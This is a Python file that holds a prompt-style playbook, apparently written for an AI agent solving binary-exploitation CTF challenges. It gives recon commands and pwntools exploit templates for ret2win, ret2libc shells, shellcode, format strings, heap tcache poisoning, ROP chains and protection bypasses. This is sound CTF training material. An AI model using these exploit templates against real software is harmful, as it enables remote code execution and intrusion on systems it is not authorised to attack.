"""Binary exploitation (pwn) playbook — expert-level methodology."""

PLAYBOOK = r"""\
## Binary Exploitation (Pwn) Playbook

You are solving a binary exploitation CTF challenge. Follow this
methodology: recon → find vulnerability → develop exploit → get flag.

---

### PHASE 1: Reconnaissance (always do ALL of these)

```bash
# Step 1: Identify the binary
file ./binary
# Note: ELF 32/64-bit, statically/dynamically linked, stripped or not

# Step 2: Check security protections
checksec --file=./binary
# Key protections:
#   RELRO:   Partial → GOT writable  |  Full → GOT read-only
#   Stack:   Canary found → need leak  |  No canary → easy overflow
#   NX:      Enabled → no shellcode on stack  |  Disabled → shellcode OK
#   PIE:     Enabled → addresses randomized  |  Disabled → fixed addresses
#   ASLR:    (OS level) → libc/stack addresses random

# Step 3: Strings & symbols
strings ./binary | grep -i "flag\|bin/sh\|system\|exec\|win\|shell\|secret"
nm ./binary 2>/dev/null | grep -i "win\|flag\|shell\|system\|backdoor"
objdump -t ./binary 2>/dev/null | grep -i "win\|flag"

# Step 4: Quick decompilation
r2 -A ./binary -c 'afl' -q          # list functions
r2 -A ./binary -c 'pdf @main' -q    # decompile main
r2 -A ./binary -c 'pdf @sym.vuln_function' -q
```

**What to look for:**
- A `win()` or `get_flag()` function → ret2win
- Calls to `gets()`, `scanf("%s")`, `read()` without size check → buffer overflow
- `printf(user_input)` without format string → format string vulnerability
- `free()` followed by use → use-after-free
- `malloc` without checks → heap overflow
- Calls to `system()` or presence of `/bin/sh` string

---

### PHASE 2: Vulnerability-Specific Exploitation

#### 2.1 Stack Buffer Overflow → ret2win

Simplest case: overflow buffer → overwrite return address → jump to win function.

```python
from pwn import *

elf = ELF('./binary')
context.binary = elf

# Step 1: Find the offset to RIP/EIP
# Method A: cyclic pattern
io = process('./binary')
io.sendline(cyclic(200))
io.wait()
core = Coredump('./core')  # or use gdb
offset = cyclic_find(core.fault_addr)  # 32-bit
# For 64-bit, fault might be in RSP — check core.rsp

# Method B: manual binary search
# Send 'A'*N and increase N until crash, then fine-tune

# Step 2: Build payload
win_addr = elf.symbols['win']  # or elf.symbols['get_flag']

# 32-bit:
payload = b'A' * offset + p32(win_addr)

# 64-bit (need stack alignment — ret gadget before function):
ret_gadget = ROP(elf).find_gadget(['ret'])[0]
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)

# Step 3: Send it
io = remote('host', port)  # or process('./binary')
io.sendline(payload)
io.interactive()
```

#### 2.2 Stack Overflow → ret2libc (NX enabled, no win function)

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')  # or ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.binary = elf

# Step 1: Leak a libc address (via puts/printf GOT entry)
rop = ROP(elf)

# 64-bit calling convention: RDI = first arg
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak puts@GOT
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # return to main for second stage

io = remote('host', port)
io.sendline(payload)
io.recvuntil(b'\\n')  # consume output before leak
leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
log.info(f"Leaked puts@libc: {hex(leak)}")

# Step 2: Calculate libc base
libc.address = leak - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Step 3: Second payload — call system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
payload2 = b'A' * offset
payload2 += p64(ret)  # stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols['system'])

io.sendline(payload2)
io.interactive()
# Then: cat /flag*
```

#### 2.3 Stack Overflow → Shellcode (NX disabled)

```python
from pwn import *
context.binary = ELF('./binary')

shellcode = asm(shellcraft.sh())  # or shellcraft.cat('/flag.txt')

# If ASLR off, jump to known stack address
# If ASLR on, use JMP ESP gadget or NOP sled

# Method: NOP sled + shellcode, return to buffer
nop_sled = b'\\x90' * 100
payload = nop_sled + shellcode
payload += b'A' * (offset - len(payload))
payload += p64(buffer_address)  # or jmp_rsp gadget

io = remote('host', port)
io.sendline(payload)
io.interactive()
```

#### 2.4 Format String Vulnerability

```python
from pwn import *

# Step 1: Find offset — where our input appears on stack
# Send: AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
# Look for 0x41414141 (AAAA) — that's your offset N
# Direct access: %N$p reads, %N$n writes

# Step 2: Read arbitrary memory
# %s reads string at address on stack
payload = p64(target_addr) + b'%7$s'  # if offset is 7

# Step 3: Write arbitrary memory (%n writes count of printed chars)
# Use pwntools fmtstr helpers:
def exec_fmt(payload):
    io = process('./binary')
    io.sendline(payload)
    return io.recvall()

fmt = FmtStr(exec_fmt)
# fmt.write(target_addr, value)
# fmt.execute_writes()

# Or use fmtstr_payload:
payload = fmtstr_payload(offset, {elf.got['printf']: elf.symbols['win']})
```

#### 2.5 Heap Exploitation

**tcache poisoning (glibc 2.26+, most common in modern CTF):**
```python
# 1. Allocate two chunks of same size
# 2. Free both → they go to tcache freelist
# 3. Overwrite freed chunk's next pointer → points to target
# 4. Allocate twice → second allocation returns target address
# 5. Write to target (e.g., __free_hook, GOT entry)

# With pwntools:
# After corrupting tcache next pointer to __free_hook:
alloc(size)  # returns normal chunk
alloc(size)  # returns __free_hook
write(system_addr)  # write system to __free_hook
free(chunk_with_binsh)  # triggers system("/bin/sh")
```

**Use-after-free:**
```python
# 1. Allocate object A
# 2. Free A (but pointer not nulled)
# 3. Allocate B of same size (reuses A's memory)
# 4. Use A again → reads/writes B's data
# Typically: overwrite vtable pointer or function pointer
```

#### 2.6 ROP Chain Building

```bash
# Find gadgets
ROPgadget --binary ./binary
ROPgadget --binary ./binary --ropchain  # auto-generate chain
ropper -f ./binary --search "pop rdi"

# one_gadget for libc (single gadget → shell)
one_gadget ./libc.so.6
# Gives addresses with constraints (e.g., [rsp+0x40] == NULL)
```

```python
# Manual ROP with pwntools
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])  # auto finds pop rdi gadget
rop.call('main')
payload = b'A' * offset + rop.chain()
```

---

### PHASE 3: Protection Bypass Techniques

| Protection | Bypass |
|-----------|--------|
| NX | ROP chain, ret2libc, ret2csu |
| ASLR | Leak address first, partial overwrite, brute-force (32-bit) |
| Stack Canary | Leak via format string, byte-by-byte brute (forking server) |
| PIE | Leak ELF base, partial overwrite of last 12 bits |
| Full RELRO | Can't overwrite GOT → target __malloc_hook, __free_hook, .fini_array |
| seccomp | Use allowed syscalls only: open/read/write (ORW chain) |

**ret2csu (universal 64-bit gadget):**
```python
# __libc_csu_init provides gadgets to control RDI, RSI, RDX
# for calling any function in GOT
csu_pop = elf.symbols['__libc_csu_init'] + 0x5a  # pop rbx..rbp; ret
csu_call = elf.symbols['__libc_csu_init'] + 0x40  # mov rdx,r15; mov rsi,r14...
```

**Seccomp bypass (ORW chain):**
```python
# Open flag, Read to buffer, Write to stdout
rop = ROP(libc)
rop.open(b'/flag.txt', 0)      # fd = open("/flag.txt", O_RDONLY)
rop.read(3, buf_addr, 100)     # read(fd=3, buf, 100)
rop.write(1, buf_addr, 100)    # write(stdout, buf, 100)
```

---

### PHASE 4: Common Patterns & Tips

1. **32-bit vs 64-bit calling conventions:**
   - 32-bit: args on stack → `func_addr + return_addr + arg1 + arg2`
   - 64-bit: args in registers → `pop_rdi;ret + arg1 + func_addr`

2. **Stack alignment (64-bit):** System calls often require RSP to be
   16-byte aligned. If exploit crashes in `movaps`, add an extra `ret`
   gadget before the function call.

3. **PIE binary with partial overwrite:** Last 12 bits (3 hex digits)
   are NOT randomized. Overwrite only the last 1-2 bytes of return
   address to redirect within the binary without leaking PIE base.

4. **Forking server = infinite tries:** Canary and ASLR stay the same
   across forks. Brute-force canary byte-by-byte (256 tries per byte).

5. **libc identification:** Leak 2+ function addresses from GOT, then
   query libc.blukat.me or libc.rip to find the exact libc version.

---

### Decision Tree
```
checksec result?
├── No NX, No canary → shellcode on stack
├── NX on, No canary → ROP / ret2libc
├── NX + Canary → leak canary first (fmt str? brute?), then ROP
├── NX + PIE → leak PIE base + libc base, then ROP
└── All protections → complex chain: leak canary → leak PIE → leak libc → ROP

Has win function? → ret2win (simplest)
Has system/execve? → ret2system
Has libc given? → ret2libc with given offsets
No libc? → leak GOT + identify libc version online
Seccomp? → ORW chain (open-read-write)
```
"""
